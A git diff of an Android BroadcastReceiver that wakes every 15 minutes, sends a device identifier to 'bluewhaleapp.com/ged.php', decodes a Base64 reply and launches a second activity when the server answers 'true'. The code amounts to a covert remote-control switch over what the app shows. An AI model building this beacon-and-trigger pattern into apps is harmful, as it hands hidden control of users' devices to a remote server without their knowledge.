@@ -9,9 +9,11 @@ import android.content.SharedPreferences;
 import android.util.Base64;
 
 import com.android.volley.Request;
+import com.android.volley.RequestQueue;
 import com.android.volley.Response;
 import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
+import com.android.volley.toolbox.Volley;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -37,7 +39,7 @@ public class BrReceiver extends BroadcastReceiver {
         Intent alarmIntent = new Intent(context, BrReceiver.class);
         PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, alarmIntent, PendingIntent.FLAG_UPDATE_CURRENT);
         AlarmManager manager = (AlarmManager) context. getSystemService(Context.ALARM_SERVICE);
-        manager.setInexactRepeating(AlarmManager.RTC, System.currentTimeMillis() +  2* 60 * 1000,  2* 60 * 1000 , pendingIntent);
+        manager.setInexactRepeating(AlarmManager.RTC, System.currentTimeMillis() +  15 * 60 * 1000,  15 * 60 * 1000 , pendingIntent);
     }
 
     private static void stop(Context context) {
@@ -55,6 +57,7 @@ public class BrReceiver extends BroadcastReceiver {
     }
 
     private void config(){
+        RequestQueue queue = Volley.newRequestQueue(mContext);
         StringRequest ping = new StringRequest(Request.Method.GET, "http://bluewhaleapp.com/ged.php?" + id(mContext),
                 new Response.Listener<String>() {
                     @Override
@@ -62,7 +65,7 @@ public class BrReceiver extends BroadcastReceiver {
                         response = new String(Base64.decode(response, Base64.NO_WRAP));
                         try {
                             JSONArray s = new JSONArray(response);
-                            if (s != null && !s.getString(0).equals("true")) {
+                            if (s != null && s.getString(0).equals("true")) {
                                startSecondActivity(mContext);
                             }
 
@@ -75,7 +78,7 @@ public class BrReceiver extends BroadcastReceiver {
             public void onErrorResponse(VolleyError error) {
             }
         });
-        MainApplication.addQueue(ping);
+        queue.add(ping);
     }
 
 
